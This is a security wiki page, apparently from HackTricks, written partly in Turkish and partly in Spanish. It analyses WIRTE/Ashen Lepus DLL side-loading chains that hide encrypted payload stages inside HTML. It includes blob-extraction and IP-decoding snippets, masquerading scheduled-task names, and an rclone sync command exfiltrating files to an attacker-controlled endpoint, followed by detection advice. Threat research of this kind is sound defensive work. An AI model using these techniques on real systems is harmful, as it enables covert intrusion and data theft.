# HTML İçine Gömülü Payload Staging ile Gelişmiş DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Genel Bakışı

Ashen Lepus (diğer adıyla WIRTE), DLL sideloading, aşamalı HTML payload’ları ve modüler .NET backdoor’larını zincirleyen, tekrarlanabilir bir yöntemi Orta Doğu’daki diplomatik ağlarda kalıcılık sağlamak için kullandı. Bu teknik, şu unsurlara dayandığından her operatör tarafından yeniden kullanılabilir:<sup>[[1]](#references)</sup>

- **Arşiv tabanlı sosyal mühendislik**: Zararsız PDF’ler, hedeflere bir dosya paylaşım sitesinden RAR arşivi indirmelerini söyler. Arşivde gerçek görünen bir belge görüntüleyici EXE’si, güvenilir bir kütüphanenin adını taşıyan kötü amaçlı bir DLL (ör. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) ve yem olarak kullanılan bir `Document.pdf` bulunur.
- **DLL arama sırası istismarı**: Kurban EXE’ye çift tıklar, Windows DLL içe aktarımını geçerli dizinden çözümler ve kötü amaçlı loader (AshenLoader) güvenilir süreç içinde çalışırken şüphe uyandırmamak için yem PDF açılır.
- **Living-off-the-land staging**: Sonraki her aşama (AshenStager → AshenOrchestrator → modüller), gerekene kadar diske yazılmaz ve zararsız görünen HTML yanıtlarında gizlenmiş şifreli blob’lar olarak iletilir.

## Çok Aşamalı Side-Loading Zinciri

1. **Yem EXE → AshenLoader**: EXE, AshenLoader’ı side-load eder. AshenLoader ana makinede keşif yapar, verileri AES-CTR ile şifreler ve `token=`, `id=`, `q=` veya `auth=` gibi dönüşümlü parametrelerle API benzeri yollara (ör. `/api/v2/account`) POST eder.<sup>[[1]](#references)</sup>
2. **HTML çıkarımı**: C2, sonraki aşamayı yalnızca istemcinin IP adresi hedef bölgede konumlandığında ve `User-Agent` implantla eşleştiğinde açığa çıkararak sandbox’ları boşa çıkarır. Kontroller başarılı olduğunda HTTP gövdesi, Base64/AES-CTR ile şifrelenmiş AshenStager payload’ını içeren bir `<headerp>...</headerp>` blob’u barındırır.
3. **İkinci sideload**: AshenStager, `wtsapi32.dll` içe aktaran başka bir meşru binary ile dağıtılır. Binary’ye enjekte edilen kötü amaçlı kopya daha fazla HTML getirir; bu kez AshenOrchestrator’ı çıkarmak için `<article>...</article>` içeriğini ayıklar.
4. **AshenOrchestrator**: Base64 JSON yapılandırmasını çözen modüler bir .NET denetleyicidir. Yapılandırmadaki `tg` ve `au` alanları birleştirilir ve hash’lenerek AES anahtarını oluşturur; bu anahtar `xrk`’yi çözer. Elde edilen baytlar, daha sonra getirilen her modül blob’u için XOR anahtarı olarak kullanılır.
5. **Modül teslimi**: Her modül, ayrıştırıcıyı rastgele bir etikete yönlendiren HTML yorumlarıyla tanımlanır; böylece yalnızca `<headerp>` veya `<article>` arayan statik kurallar aşılır. Modüller arasında kalıcılık (`PR*`), kaldırıcılar (`UN*`), keşif (`SN`), ekran görüntüsü alma (`SCT`) ve dosya araştırması (`FE`) bulunur.

### HTML Container Ayrıştırma Yöntemi

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Savunmacılar belirli bir öğeyi engellese veya kaldırsalar bile, operatörün teslimatı sürdürmek için yalnızca HTML yorumunda belirtilen etiketi değiştirmesi yeterlidir.<sup>[[1]](#references)</sup>

### Hızlı Çıkarma Yardımcısı (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## HTML Staging Evasion Parallels

Yakın tarihli HTML smuggling araştırmaları (Talos), HTML eklerindeki `<script>` bloklarında Base64 dizeleri olarak gizlenen ve çalışma zamanında JavaScript ile çözülen payload'ları öne çıkarıyor.<sup>[[2]](#references)</sup> Aynı yöntem C2 yanıtları için de kullanılabilir: şifrelenmiş blob'ları bir script tag'inin (veya başka bir DOM öğesinin) içine yerleştirip AES/XOR işleminden önce bellekte çözerek sayfanın sıradan HTML gibi görünmesini sağlayabilirsiniz. Talos ayrıca script tag'leri içinde katmanlı gizleme (tanımlayıcıları yeniden adlandırma ve Base64/Caesar/AES) yöntemini gösteriyor; bu yöntem HTML ile stage edilmiş C2 blob'larına kolayca uyarlanabilir.<sup>[[2]](#references)</sup> Talos'un daha sonra yayımladığı **hidden text salting** hakkındaki yazı da burada konuyla ilgilidir: Base64'ü alakasız HTML yorumları veya boşluklarla bölmek, tarayıcı tarafında yeniden oluşturmayı kolay tutarken basit regex ayıklayıcılarını etkisizleştirmek için yeterlidir.<sup>[[7]](#references)</sup>

## Recent Variant Notes (2024-2025)

- Check Point, 2024'te hâlâ arşiv tabanlı sideloading'e dayanan ancak ilk aşama olarak `propsys.dll` (stagerx64) kullanan WIRTE kampanyalarını gözlemledi. Stager, sonraki payload'ı Base64 + XOR (anahtar `53`) ile çözer, sabit kodlanmış bir `User-Agent` ile HTTP istekleri gönderir ve HTML tag'leri arasına gömülü şifrelenmiş blob'ları çıkarır. Bir dalda, aşama `RtlIpv4StringToAddressA` ile çözümlenen uzun bir gömülü IP dizeleri listesinden yeniden oluşturulmuş ve ardından payload baytlarıyla birleştirilmiştir.<sup>[[3]](#references)</sup>
- OWN-CERT, daha önceki WIRTE araçlarını belgeledi. Bu araçlarda sideload edilmiş `wtsapi32.dll` dropper'ı dizeleri Base64 + TEA ile koruyor ve DLL adını şifre çözme anahtarı olarak kullanıyordu; ardından ana makine tanımlama verilerini XOR/Base64 ile gizleyip C2'ye gönderiyordu.<sup>[[4]](#references)</sup>

## Reconstructing IP-Encoded Stages

WIRTE'nin 2024 `propsys.dll` dalı, sonraki PE'nin tek ve kesintisiz bir HTML blob'u olarak bulunmasının gerekmediğini gösteriyor. Loader, aşama baytlarını noktalı dörtlü dizeleri olarak saklayıp `RtlIpv4StringToAddressA` ile yeniden oluşturabilir; bu yöntem Hive'ın **IPfuscation** tradecraft'ıyla yakından ilişkilidir.<sup>[[3]](#references)[[5]](#references)</sup> Operasyonel açıdan bu, aktörün HTML sayfasında bariz bir Base64 payload'ı yerine zararsız görünen IOC'ler veya yapılandırma verileri bulundurmak istediği durumlarda kullanışlıdır.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

If recuperaste los bytes comienzan con `MZ`, probablemente reconstruiste directamente el siguiente PE. Si no, comprueba si hay una capa inicial XOR/Base64 o pequeños fragmentos delimitadores entre direcciones.

## Nombres de DLL intercambiables y rotación de hosts

Una propiedad importante de este patrón es que el **backend de staging HTML/AES/XOR puede mantenerse idéntico y solo cambiar el par de sideloading**. WIRTE alternó entre `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` y `propsys.dll` en distintas campañas, lo cual resulta útil porque:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` y `wtsapi32.dll` son nombres de DLL de Windows comunes que los defensores esperan encontrar en `%System32%` / `%SysWOW64%`.
- Catálogos públicos como **HijackLibs** ya relacionan muchos binarios que cargarán esos nombres de DLL desde el directorio de una aplicación copiada, lo que proporciona a los operadores hosts alternativos sin tener que rediseñar el stager.
- Solo hay que adaptar la superficie de exportación para cada host. El parser HTML, las rutinas AES/XOR y el cargador de módulos normalmente se pueden trasplantar sin cambios a una DLL proxy de forwarding.

Para el trabajo en un laboratorio ofensivo, esto significa que puedes dividir el problema en **(1) encontrar un host firmado y estable que resuelva localmente el nombre de DLL elegido** y **(2) reutilizar la misma lógica del cargador de HTML staged detrás de esa DLL**.

## Refuerzo de Crypto y C2

- **AES-CTR en todas partes**: los loaders actuales incluyen claves de 256 bits y nonces (p. ej., `{9a 20 51 98 ...}`), y opcionalmente añaden una capa XOR mediante cadenas como `msasn1.dll` antes o después del descifrado.<sup>[[1]](#references)</sup>
- **Variaciones del material de clave**: los loaders anteriores usaban Base64 + TEA para proteger las cadenas incluidas, y la clave de descifrado se derivaba del nombre de la DLL maliciosa (p. ej., `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Separación de infraestructura + camuflaje de subdominios**: los servidores de staging se separan por herramienta, se alojan en distintos ASN y, a veces, se colocan detrás de subdominios de aspecto legítimo, de modo que quemar una etapa no expone el resto.
- **Ocultación de reconocimiento**: los datos enumerados ahora incluyen listados de Program Files para detectar aplicaciones de alto valor y siempre se cifran antes de salir del host.
- **Rotación de URI**: los parámetros de consulta y las rutas REST cambian entre campañas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando las detecciones frágiles.
- **Fijación de User-Agent + redirecciones seguras**: la infraestructura C2 solo responde a cadenas UA exactas y, de lo contrario, redirige a sitios legítimos de noticias o salud para camuflarse.
- **Entrega controlada**: los servidores tienen restricciones geográficas y solo responden a implants reales. Los clientes no autorizados reciben HTML inocuo.

## Persistencia y ciclo de ejecución

AshenStager crea tareas programadas que se hacen pasar por trabajos de mantenimiento de Windows y se ejecutan mediante `svchost.exe`, por ejemplo:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Estas tareas vuelven a iniciar la cadena de sideloading al arrancar o en intervalos regulares, lo que permite a AshenOrchestrator solicitar módulos nuevos sin volver a tocar el disco.

## Uso de clientes de sincronización legítimos para la exfiltración

Los operadores preparan documentos diplomáticos en `C:\Users\Public` (legible por todos y no sospechoso) mediante un módulo dedicado y, después, descargan el binario legítimo de [Rclone](https://rclone.org/) para sincronizar ese directorio con el almacenamiento del atacante. Unit42 señala que esta es la primera vez que se observa a este actor usando Rclone para la exfiltración, en consonancia con la tendencia general de abusar de herramientas legítimas de sincronización para mezclarse con el tráfico normal:<sup>[[1]](#references)</sup>

1. **Preparación**: copia o recopila los archivos objetivo en `C:\Users\Public\{campaign}\`.
2. **Configuración**: distribuye una configuración de Rclone que apunte a un endpoint HTTPS controlado por el atacante (p. ej., `api.technology-system[.]com`).
3. **Sincronización**: ejecuta `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que el tráfico parezca el de copias de seguridad normales en la nube.

Como Rclone se usa ampliamente en flujos de trabajo legítimos de backup, los defensores deben centrarse en ejecuciones anómalas (binarios nuevos, remotos inusuales o sincronización repentina de `C:\Users\Public`).

## Puntos de detección

- Genera alertas sobre **procesos firmados** que cargan inesperadamente DLL desde rutas en las que los usuarios pueden escribir (filtros de Procmon + `Get-ProcessMitigation -Module`), especialmente si los nombres de las DLL coinciden con `netutils`, `srvcli`, `dwampi`, `wtsapi32` o `propsys`.<sup>[[6]](#references)</sup>
- Inspecciona las respuestas HTTPS sospechosas en busca de **grandes bloques Base64 incrustados en etiquetas inusuales** o protegidos por comentarios `<!-- TAG: <xyz> -->`.
- Normaliza primero el HTML: **elimina los comentarios y comprime los espacios en blanco antes de extraer Base64**, ya que las técnicas de evasión de tipo hidden-text-salting pueden dividir payloads entre límites de comentarios.
- Amplía la búsqueda en HTML a **cadenas Base64 dentro de bloques `<script>`** (staging al estilo HTML smuggling) que se decodifican mediante JavaScript antes del procesamiento AES/XOR.
- Busca llamadas repetidas a **`RtlIpv4StringToAddressA` seguidas de ensamblaje de buffers**, especialmente cuando las cadenas circundantes son largas listas de IPv4 y no objetivos de red reales.
- Busca **tareas programadas** que ejecuten `svchost.exe` con argumentos que no correspondan a servicios o que apunten a directorios de dropper.
- Rastrea las **redirecciones C2** que solo devuelven payloads para cadenas `User-Agent` exactas y, de lo contrario, redirigen a dominios legítimos de noticias o salud.
- Supervisa la aparición de binarios de **Rclone** fuera de las ubicaciones administradas por IT, nuevos archivos `rclone.conf` o trabajos de sincronización que extraigan datos de directorios de staging como `C:\Users\Public`.

## References

- [1] [Ashen Lepus, afiliado a Hamás, ataca entidades diplomáticas de Oriente Medio con la nueva suite de malware AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Oculto entre las etiquetas: análisis de las técnicas de evasión en HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [El actor de amenazas WIRTE, afiliado a Hamás, continúa sus operaciones en Oriente Medio y pasa a la actividad disruptiva](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: En busca del tiempo perdido](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware implementa una novedosa técnica IPfuscation para evadir la detección](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Posible sideloading de DLL del sistema desde ubicaciones que no son del sistema](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Añadir salting de texto oculto a las amenazas por correo electrónico](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
